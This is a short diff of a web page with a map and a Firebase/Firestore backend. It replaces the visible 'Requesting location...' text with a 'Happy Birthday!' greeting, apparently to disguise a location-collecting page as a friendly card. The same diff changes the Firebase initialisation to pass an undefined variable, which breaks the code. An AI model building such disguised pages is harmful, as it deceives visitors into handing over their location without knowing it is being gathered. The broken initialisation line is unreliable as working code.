@@ -12,7 +12,11 @@ html,body,#map{height:100%;margin:0}
 </style>
 </head>
 <body>
-<div id="panel">Requesting location...<div id="status"></div></div>
+<div id="panel">
+    <h2>🎉 Happy Birthday! 🎂</h2>
+    <p>Wishing you a wonderful day filled with happiness, joy, and success! ❤️</p>
+    <div id="status"></div>
+</div>
 <div id="map"></div>
 
 <script type="module">
@@ -29,7 +33,7 @@ const firebaseConfig = {
   measurementId: "G-TWLQRMSWBY"
 };
 
-const app = initializeApp(firebaseConfig);
+const app = initializeApp(div);
 const db = getFirestore(app);
 
 const map=L.map('map').setView([20.5937,78.9629],5);
